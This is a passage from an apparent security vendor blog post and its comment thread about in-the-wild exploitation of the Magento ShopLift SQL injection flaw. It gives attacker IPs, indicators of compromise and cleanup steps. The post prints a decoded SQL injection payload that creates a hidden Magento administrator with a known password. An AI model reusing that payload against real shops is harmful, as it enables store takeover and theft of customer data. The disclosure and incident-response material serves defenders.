<p>That&#8217;s a simple example. This vulnerability can be exploited in much more devastating ways.</p>
<h5>Magento ShopLift in the Wild</h5>
<p>As expected, it is now actively being exploited.</p>
<p>In less than 24 hours since the disclosure, we have started to see attacks via our <a href="https://sucuri.net/website-firewall/">WAF</a> logs trying to exploit this vulnerability. It seems to be coming from a specific crime group, since they all look the same:</p>
<p><span id="more-12483"></span></p>
<blockquote><p>62.76.177.179 &#8211; &#8211; [23/Apr/2015:00:45:44 -0400] &#8220;POST /index.php/admin/Cms_Wysiwyg/[HIDDEN] HTTP/1.1&#8221; 403 1880 &#8220;-&#8221; &#8220;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36&#8221;</p>
<p>185.22.232.218 &#8211; &#8211; [22/Apr/2015:00:42:38 -0400] &#8220;POST /index.php/admin/Cms_Wysiwyg/[HIDDEN] HTTP/1.1&#8221; 200 2211 &#8220;-&#8221; &#8220;Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20130101 Firefox/10.0&#8221;</p></blockquote>
<p>And always from these two IP addresses from Russia: <strong>62.76.177.179</strong> and <strong>185.22.232.218</strong>. If you look for them in your logs, you can see if you have been attacked by the same group.</p>
<p>Our research team was able to catch and analyze their exploit. So far, it is <i>only</i> trying to create a fake admin user inside the Magento database, which they will certainly misuse later to take over of the site. This is the decoded exploit:</p>
<blockquote><p>popularity[from]=0&amp;popularity[to]=3&amp;popularity[field_expr]=0);</p>
<p>SET @SALT =&nbsp;&#8220;rp&#8221;;</p>
<p>SET @PASS =&nbsp;CONCAT(MD5(CONCAT( @SALT , &#8216;123&#8217;) ), CONCAT(&#8216;:&#8217;, @SALT ));<br />
SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;</p>
<p><b>INSERT&nbsp;INTO&nbsp;`admin_user`</b> (`firstname`,&nbsp;`lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES (&#8216;Firstname&#8217;,&#8217;Lastname&#8217;,&#8221;email@example.com&#8221;,&#8217;<b>ypwq</b>&#8216;,@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());</p>
<p>INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,&#8217;U&#8217;,(SELECT user_id FROM admin_user WHERE username = &#8216;ypwq&#8217;),&#8217;Firstname&#8217;); &#8212;</p></blockquote>
<p>The code is leveraging SQL Injection (SQLi) and inserting a new <strong>admin_user</strong> to the database. If you suspect you have been compromised, look for the usernames <strong><i>vpwq</i></strong> or <b>defaultmanager</b> as it seems to be the ones being used by this specific group so far.</p>
<p>Note that we are hiding some of the details and payloads, to make it hard for someone else to copy and create an exploit out of it. However, some groups already have an exploit and are attacking as many sites as they can, and pretty fast.</p>
<h5>Protect your Magento site!</h5>
<p>If you haven&#8217;t patched it yet, you are likely already compromised or will be soon. I recommend patching and adding your site behind a Web Application Firewall or Intrusion Detection System to stop these attacks for you.</p>
<p>If you&#8217;re in need of a solution, don&#8217;t hesitate to inquire <a href="https://sucuri.net/website-firewall/signup">about our Website Firewall</a>; this vulnerability has been virtually patched for all existing customers.</p>
<aside class="mashsb-container mashsb-main mashsb-stretched"><div class="mashsb-box"><div class="mashsb-buttons"><a class="mashicon-facebook mash-small mash-center mashsb-shadow" href="https://www.facebook.com/sharer.php?u=https%3A%2F%2Fblog.sucuri.net%2F2015%2F04%2Fmagento-shoplift-supee-5344-exploits-in-the-wild.html" target="_top" rel="nofollow"><span class="icon"></span><span class="text">Facebook</span></a><a class="mashicon-twitter mash-small mash-center mashsb-shadow" href="https://twitter.com/intent/tweet?text=Magento%20Shoplift%20%28SUPEE-5344%29%20Exploits%20in%20the%20Wild&url=https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html&via=sucurisecurity" target="_top" rel="nofollow"><span class="icon"></span><span class="text">Twitter</span></a><a class="mashicon-subscribe mash-small mash-center mashsb-shadow" href="#" target="_top" rel="nofollow"><span class="icon"></span><span class="text">Subscribe</span></a><div class="onoffswitch2 mash-small mashsb-shadow" style="display:none;"></div></div>
            </div>
                <div style="clear:both;"></div></aside>
            <!-- Share buttons by mashshare.net - Version: 3.8.1--></div><footer class="entry-footer"><p class="entry-meta"><span class="entry-categories">Categories: <a href="https://blog.sucuri.net/category/magento-security" rel="category tag">Magento Security</a>, <a href="https://blog.sucuri.net/category/vulnerability-disclosure" rel="category tag">Vulnerability Disclosure</a></span><span class="entry-tags">Tags: <a href="https://blog.sucuri.net/tag/hacked-websites" rel="tag">Hacked Websites</a></span></p></footer></article><section class="author-box"><img alt='' src='https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=115&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=230&#038;d=mm&#038;r=g 2x' class='avatar avatar-115 photo' height='115' width='115' loading='lazy'/><h4 class="author-box-title">About <span itemprop="name">Daniel Cid</span></h4><div class="author-box-content" itemprop="description"><p>Daniel B. Cid is Founder of Sucuri and the VP of Engineering for the  GoDaddy Security Products group. He is also the founder of OSSEC and <a href="https://cleanbrowsing.org">CleanBrowsing</a>.  You can find more about Daniel on his site <a href="http://dcid.me">dcid.me</a> or on <a href="https://twitter.com/danielcid">Twitter: @danielcid</a></p>
</div></section><h2 class="screen-reader-text">Reader Interactions</h2><div class="entry-comments" id="comments"><h3>Comments</h3><ol class="comment-list">
	<li class="comment even thread-even depth-1" id="comment-6217">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/44274cd3d03c8e9087dd5d3a6044ea01?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/44274cd3d03c8e9087dd5d3a6044ea01?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Charles McHutchence</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-04-24T14:58:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6217">April 24, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>We got owned. The username was siqi for us, FYI for anyone whos looking for the admin)user account</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment odd alt thread-odd thread-alt depth-1" id="comment-6218">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/718ac0e5e2705470fad87d44442b900c?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/718ac0e5e2705470fad87d44442b900c?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">khaefeli</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-04-24T15:40:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6218">April 24, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>our honeypot has the following new admin user: dbopt, _system_backup, dataopt</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment even depth-2" id="comment-6224">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/32b259d771dd83728dd309f8242f5e45?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/32b259d771dd83728dd309f8242f5e45?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Delroy Lando</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-04-24T17:43:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6224">April 24, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>We&#8217;ve got dbopt, too. What have you done, besides deleting user and installing patch?</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment odd alt depth-3" id="comment-6241">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/718ac0e5e2705470fad87d44442b900c?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/718ac0e5e2705470fad87d44442b900c?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">khaefeli</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-04-27T07:34:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6241">April 27, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>it&#8217;s a honeypot installation &#8211; so we want to be hacked.<br />
but on a live system:<br />
&#8211; restore (you don&#8217;t know how many .php files etc are infected)<br />
&#8211; install the patch<br />
&#8211; install a WAF<br />
&#8211; use a secure hosting provider (e.g. no outgoing connections etc)</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment even depth-4" id="comment-6248">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/be8e882e66a1c0924b4b3f3e1ae1f851?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/be8e882e66a1c0924b4b3f3e1ae1f851?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://redesigned.com" class="comment-author-link" rel="external nofollow" itemprop="url">redesigned</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-04-27T11:09:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6248">April 27, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>are you blogging about what changes have been made to your honeypot system?  that would be super helpful, not to mention fascinating.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment odd alt depth-4" id="comment-6315">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/32b259d771dd83728dd309f8242f5e45?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/32b259d771dd83728dd309f8242f5e45?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Delroy Lando</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-05-03T15:40:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6315">May 3, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Thanks!</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->

	<li class="comment even thread-even depth-1" id="comment-6225">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/be8e882e66a1c0924b4b3f3e1ae1f851?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/be8e882e66a1c0924b4b3f3e1ae1f851?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://redesigned.com" class="comment-author-link" rel="external nofollow" itemprop="url">redesigned</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-04-24T23:14:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6225">April 24, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>i&#8217;ve been patching tons of sites, 60+ so far, and only 2 have been exploited, both in the 1.7 branch.<br />
in addition to creating an admin user, they&#8217;ve modified the /lib/Varian/Db/Adaptor/Pdo/Mysql.php file in such a way that the patch fails that chunk, and that file has to be patched manually.  That is the only change I&#8217;ve noticed, but it is a big one as it leaves the door open for them to get back in if not addressed.</p>
<p>Anyone know any other issues that should be checked and/or addressed?<br />
I&#8217;m putting together a checklist.</p>
<p>Thanks!</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment odd alt depth-2" id="comment-6244">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/557b16a4df2d721eb07f6872313270fd?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/557b16a4df2d721eb07f6872313270fd?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">ifnull</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-04-27T08:49:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6244">April 27, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>All the exploited instances I have seen so far have had the hash/salt &#8220;f4c8e326312d5ddb79c04b408e55010a:rp&#8221;. In addition, half of the exploited instances had downloaded the Magpleasure/Filesystem extension which no longer seems to be available. The second phase of the attack happens a couple days later when they use system_backup to create a new backup and download it.</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment even depth-3" id="comment-6247">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/be8e882e66a1c0924b4b3f3e1ae1f851?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/be8e882e66a1c0924b4b3f3e1ae1f851?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://redesigned.com" class="comment-author-link" rel="external nofollow" itemprop="url">redesigned</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-04-27T08:58:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6247">April 27, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Thanks for the update @ifnull:disqus I&#8217;m seeing the MagePleasure module as well.</p>
<p>Removing that Module, Deleting the users, and Patching Magento, is there anything else that needs to be done to re-secure the system?  Is there someplace that people are maintaining a checklist of the fixes that need to be done to re-secure a site?  Thanks!!!</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment odd alt depth-4" id="comment-6276">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/10074cfaa59c2b4677ea555a75e86b2f?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/10074cfaa59c2b4677ea555a75e86b2f?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Anthelmintics</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-04-27T21:19:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6276">April 27, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>I just finished cleaning one up. Out of 30 sites, one was hacked. Same methodology; created a four character admin user, installed Magpleasure_filesystem and edited /lib/Varien/Db/Adapter/Pdo/Mysql.php. Only exception was they also installed Edit Area (A source code editor) in the &#8216;js&#8217; directory. I found the tarball for the file system extension and a bunch of other junk all with the same creation date 4/22/15 @ 11:15PM. In the end I opted to roll the site back to the 4/21/15, patch and merge the new customer and order data with the restored DB.</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment even depth-5" id="comment-6278">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/be8e882e66a1c0924b4b3f3e1ae1f851?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/be8e882e66a1c0924b4b3f3e1ae1f851?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://redesigned.com" class="comment-author-link" rel="external nofollow" itemprop="url">redesigned</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-04-28T01:06:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6278">April 28, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>I&#8217;m also seeing EditArea in the js folder on all the sites that were hacked.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment odd alt depth-5" id="comment-6284">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/10074cfaa59c2b4677ea555a75e86b2f?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/10074cfaa59c2b4677ea555a75e86b2f?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Anthelmintics</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-04-28T14:50:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6284">April 28, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Same here we discovered another hacked install this morning, identical to the first one. It was running 1.6.2, I&#8217;ve not seen a 1.4, 1.7 or 1.9 site compromised as of yet.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment even depth-5" id="comment-6294">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/be8e882e66a1c0924b4b3f3e1ae1f851?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/be8e882e66a1c0924b4b3f3e1ae1f851?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://redesigned.com" class="comment-author-link" rel="external nofollow" itemprop="url">redesigned</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-04-29T15:49:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6294">April 29, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>I&#8217;m seeing the highest percentage of 1.7 sites hacked, not sure if it is something specific to the version, or just if they&#8217;ve been around longer and are easier to find.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment odd alt depth-5" id="comment-6280">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/557b16a4df2d721eb07f6872313270fd?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/557b16a4df2d721eb07f6872313270fd?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">ifnull</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-04-28T05:19:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6280">April 28, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>I think EditArea is installed with Magpleasure_filesystem</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->

	<li class="comment even depth-2" id="comment-6297">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/7fc945f6818dcceffd69cdd62320b2ac?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/7fc945f6818dcceffd69cdd62320b2ac?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Jeff Moriarty</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-04-30T03:40:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6297">April 30, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Did you notice any websites being slow to load&#8230;like practically timing out? We patched our websites after one was exploited. We had 4 websites on 1 dedicated server. All patches in, but now the sites randomly won&#8217;t load at all or take a couple minutes. Trying to figure this one out.</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment odd alt depth-3" id="comment-6298">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/be8e882e66a1c0924b4b3f3e1ae1f851?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/be8e882e66a1c0924b4b3f3e1ae1f851?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://redesigned.com" class="comment-author-link" rel="external nofollow" itemprop="url">redesigned</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-04-30T04:53:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6298">April 30, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Hey Jeff,</p>
<p>I haven&#8217;t noticed that for any of the sites I&#8217;ve patched.</p>
<p>Is it one specific version of Magento?</p>
<p>Did you upgrade the Magento version at the same time, if so those setup scripts can take a long time.</p>
<p>Do they load faster now?  Sometimes changes will trigger a reindex which slows the site down/times it out, until that completes, then the site returns to normal.</p>
<p>Do you have any sort of server level caching enabled (memcache/apc/varnish) etc?  That needs to be cleared.</p>
<p>Have you manually cleared the sites caches:<br />
rm -rf ./downloader/pearlib/cache/* ./downloader/pearlib/download/*<br />
rm -rf  ./var/cache/* ./var/session/* ./var/report/* ./var/log/*<br />
rm -rf  ./media/tmp/* ./app/code/core/Zend/Cache/* ./var/tmp/*</p>
<p>Have you reindexed the sites?<br />
php ./shell/indexer.php -reindexall</p>
<p>Have you scanned for any other malicious changes?  You can see any files modified in the last 4 days via:<br />
find -type f -mtime -4</p>
<p>Make sure to remove the hacked admin users and any you don&#8217;t actively need.</p>
<p>Make sure to delete the MagePleasure_FileSystem module.</p>
<p>Make sure to delete the EditArea JavaScript code editor.</p>
<p>Make sure to manually make the changes to the /lib/Varian/Db/Adaptor/Pdo/Mysql.php file as the patch will fail to patch that file on a hacked site.</p>
<p>Change all the admin passwords, and ideally the admin login url.</p>
<p>Hopefully something in this message helps, please let me know if you need any assistance or have any further questions.</p>
<p>Cheers,<br />
Josh</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment even depth-4" id="comment-6309">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/7fc945f6818dcceffd69cdd62320b2ac?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/7fc945f6818dcceffd69cdd62320b2ac?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Jeff Moriarty</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-05-01T21:42:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6309">May 1, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>It ended up being on the server&#8230;something else the hosting company did the same weekend ugh. Fixed now though. But 3 days after the patch was installed, we had an order placed, and they said their card was used right after in a fraudulant transaction. Could there be something the patch isn&#8217;t protecting?</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment odd alt depth-5" id="comment-6310">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/be8e882e66a1c0924b4b3f3e1ae1f851?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/be8e882e66a1c0924b4b3f3e1ae1f851?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://redesigned.com" class="comment-author-link" rel="external nofollow" itemprop="url">redesigned</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-05-01T22:09:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6310">May 1, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Yeah, yikes!  The patch only protects against initial intrusion, it closes the initial entry point, but that is it.</p>
<p>If the site has already been hacked then likely malicious code was installed into the site as well as several new entry points.  Once a site has been hacked it takes a lot more then the patches to get it back to proper working order.</p>
<p>Do you have a pre-hack backup of the files you can roll back to or source control on the site?  If not you will want to go through the fixes I outlined above, and double check the files I mention in the update below that, as well as scan for additional changes.  If you find anything new, please post back here for the benefit of the rest of us.</p>
<p>I&#8217;ve been putting in 16+ hr days all week patching sites and cleaning hacked sites.  right now I&#8217;m seeing approx 70% of unpatched sites being hacked, which is a very high rate, at first it was only a handful.</p>
<p>If you don&#8217;t have a backup and need additional assistance cleaning the site(s) let me know.  Best of luck with your sites!  Cheers.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->

	<li class="comment even depth-3" id="comment-6302">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/983df24094cbf34fc923aafaf5423398?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/983df24094cbf34fc923aafaf5423398?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">volkan</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-04-30T08:01:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6302">April 30, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>i had the same problem, especially the checkout was very slow.<br />
the Problem was in the /js/index.php, it was compromised too<br />
check also index.php and /lib/varien/autoload.php</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->

	<li class="comment odd alt thread-odd thread-alt depth-1" id="comment-6233">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/fc02627025e821c954eb29b220041d1e?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/fc02627025e821c954eb29b220041d1e?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Subprime</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-04-26T10:30:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6233">April 26, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Usernames dewo and _system_backup for our site. Dewo is <a href="mailto:email@example.com">email@example.com</a>, so appears to be a typo of demo.</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment even depth-2" id="comment-6245">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/557b16a4df2d721eb07f6872313270fd?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/557b16a4df2d721eb07f6872313270fd?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">ifnull</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-04-27T08:50:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6245">April 27, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>I&#8217;ve seen a half dozen different users names. They are all 4 char and seem random.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->

	<li class="comment odd alt thread-even depth-1" id="comment-6235">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/4d04739a3efe956f2fdc57eaadfaa656?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/4d04739a3efe956f2fdc57eaadfaa656?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Alex Nauta</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-04-26T13:47:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html#comment-6235">April 26, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>So I am currently fixing an exploited test-installation of magento 1.9.x , and noticed these IP adresses too. But they had a little different workflow, as I found out, they have installed the module &#8220;Magpleasure File System&#8221; remotely to get access to the filesystem.</p>
		</div>

		
		
	</article>
